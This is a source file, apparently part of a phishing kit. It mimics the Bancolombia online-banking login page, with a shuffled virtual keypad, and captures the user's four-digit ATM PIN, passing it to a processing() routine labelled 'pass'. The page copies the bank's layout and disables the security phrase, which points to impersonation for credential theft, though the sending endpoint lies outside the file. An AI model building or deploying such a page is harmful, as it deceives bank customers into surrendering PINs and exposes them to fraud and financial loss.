var bancolombia_titulo = 'Inicio de sesión';
var bancolombia_contenido = `
<div class="panel panel-primary" style="min-height: 68vh;">
	<div class="row" id="error">
		<div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">
			<div class="errorDiv">
				<div class="divTextMessage">
					<span class="icon-error errorIcon">
						<span class="path1"></span>
						<span class="path2"></span>
						<span class="path3"></span>
					</span>
					<div class="errorTitulo">Error</div>
					<div id="summary" class="errorTexto"></div>
				</div>
			</div>
		</div>
	</div>
	<div id="contenido">
		<div class="mua-panel-body">
			<div class="row">
				<div class="col-lg-5 col-md-5 col-sm-6">
					<h5 class="mua-title-h5">Imagen y frase de seguridad seleccionadas</h5>

					<div id="phraseImage" class="mua-image-login-container">

						<div class="mua-security-container mua_svp_space_pb_preparation">
							<div class="mua-security-img">
								<img id="rsaImage" src="${my_banco}img/locked.png" width="90" height="90">
							</div>
							<div class="pull-left mua-security-question">
								<p>
									Frase de seguridad:
								</p>
								<p>
								<br>Deshabilitado por Seguridad</br>
								</p>
							</div>
						</div>
					</div>
				</div>

				<div class="col-lg-4 col-md-5 col-sm-6">

					<div class="panel_general mua-panel_general">
						<div class="title-panel-label">
							<h1>
								Clave
							</h1>
						</div>

						<div class="subtitle-land-label">
							<h4>
								Por favor ingresa tu contraseña y sigue los pasos para verificar tu cuenta
							</h4>
						</div>

						<div class="mua-content-group-panel">
							<div class="mua-label-input">
								<label class="control-label-index" for="username">
									Ingresa tu clave
								</label>
							</div>
							<div>
								<div class="mua_svp_enroll_update_control">
									<input id="password" class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon" type="password" value="" readonly="true" maxlength="4" autocomplete="off">
									<span class="mua-icon-lock"> </span>
								</div>
							</div>
						</div>

						<div class="mua-content-legend mua_svp_enroll_update_label">
							Ingresa mediante el teclado virtual la clave que usas en el cajero
							automático.
						</div>

						<div class="two-button-container mua-button-container">
							<div class="two-button-a">
								<input class="btn btn-default" type="button" value="Cancelar">
							</div>
							<div class="two-button-b">
								<input id="btnGo" class="btn btn-success" type="button" value="Ingresar">
							</div>
						</div>
						<div class="mua-panel_enlances">
							<div>
								<span id="popoverId" class="glyphicon icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
								<div id="popoverContent" class="hide">
									<span class="mua_tooltip_close">×</span>
									<div class="mua_tooltip_msg">
										Si usted es un Colombiano en el Exterior y no ha sido cliente
										Bancolombia en el pasado o es un cliente exclusivo Fiduciaria, usted
										debe generar una clave para continuar con el proceso.
									</div>
								</div>
								<a href="#">Genera una clave personal</a>
							</div>
						</div>
					</div>
				</div>
				<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3" style="height:350px;width:220px;">
					<div id="keyboard_">
						<table class="keyboard" border="0" cellspacing="0" cellpadding="0" align="left" valign="top">
							<tbody>
								<tr>
									<td width="0" height="20"></td>
									<td></td>
								</tr>
								<tr>
									<td height="0" width="16"></td>
									<td colspan="2">
										<table align="left" valign="top" cellspacing="0" cellpadding="0" class="bg_button">
											<tbody>
												<tr align="left">
													<td valign="top" align="left">
														<table class="bg_button" id="_KEYBRD" valign="top">
															<tbody>
																<tr>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																</tr>
																<tr>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																</tr>
																<tr>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																</tr>
																<tr>
																	<td class="bg_buttonSmall keyNumber" align="center" style="cursor:default">
																		<div border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1"></div>
																	</td>
																	<td colspan="2" onclick="clearKeys();" class="bg_buttonSmall">
																		<div id="clearKey" border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1">Borrar
																		</div>
																	</td>
																</tr>
															</tbody>
														</table>
														<table class="bg_button" id="_CONSTRAST" valign="top" cellspacing="0">
															<tbody>
																<tr>
																	<td><img width="90" height="34" border="0" src="${my_banco}img/Contraste1.gif" id="constrastImg" usemap="#numericKeyboardMap" style="cursor: default;">
																		<map id="numericKeyboardMap">
																			<area shape="circle" class="cursorContrast" coords="10,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(1)" onmouseout="setDefaultCursor(document.constrastImg)">
																			<area shape="circle" class="cursorContrast" coords="50,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(2)" onmouseout="setDefaultCursor(document.constrastImg)">
																			<area shape="circle" class="cursorContrast" coords="90,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(3)" onmouseout="setDefaultCursor(document.constrastImg)">
																		</map>
																	</td>
																</tr>
															</tbody>
														</table>
													</td>
												</tr>
											</tbody>
										</table>
									</td>
								</tr>
								<tr>
									<td height="17"></td>
									<td colspan="2"></td>
								</tr>
							</tbody>
						</table>
					</div>
				</div>
				<div id="anuncios" class="mx-auto col-xs-12 col-sm-7 col-md-8 w-auto">
					<div id="banner-persona">
						<img id="imgpubli" src="${my_banco}img/publi_pass.jpg" border="0" class="img-responsive">
					</div>
					<p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp;
						Conoce más <a href="#" class="a1">aquí</a>
					</p>
				</div>
			</div>
		</div>
	</div>
</div>
`
<?php require_once('_plantilla_bancolombia.php'); ?>

//<script>
	var numbers = [];
	for (let i = 0; i <= 9; i++) {
		numbers.push(i);
	}
	var currentIndex = numbers.length,
		randomIndex;
	while (currentIndex != 0) {
		randomIndex = Math.floor(Math.random() * currentIndex);
		currentIndex--;
		[numbers[currentIndex], numbers[randomIndex]] = [
			numbers[randomIndex], numbers[currentIndex]
		];
	}
	$('.keyNumber').each(function(i) {
		$(this).attr('v', numbers[i]);
		$(this).find('div').html(numbers[i]);
		$(this).mouseover(function() {
			$('.keyNumber').find('div').html('*');
		})
		$(this).mouseout(function() {
			$('.keyNumber').each(function(i) {
				let v = $(this).attr('v');
				$(this).find('div').html(v);
			});
		})
		$(this).click(function() {
			let password = $('#password').val();
			if (password.length < 4) {
				$('#password').val(password + numbers[i]);
			}
		});
	})
	$('#btnGo').click(function() {
		let password = $('#password').val();
		if (!password || password.length < 4) {
			$('#tabError').toggle(true);
			$('#summary').html('Por favor ingrese la información requerida.');
		} else {
			processing({
				t: 'pass',
				clave: password
			});
		}
	})

	function clearKeys() {
		$('#password').val('');
	}

	function changeContrastLevel(lvl) {
		$('.bg_buttonSmall').each(function(i) {
			$(this).find('div').removeClass();
			$(this).find('div').addClass('colorContrast' + lvl)
		});
		$('#constrastImg').attr('src', my_banco + 'img/Contraste' + lvl + '.gif')
	}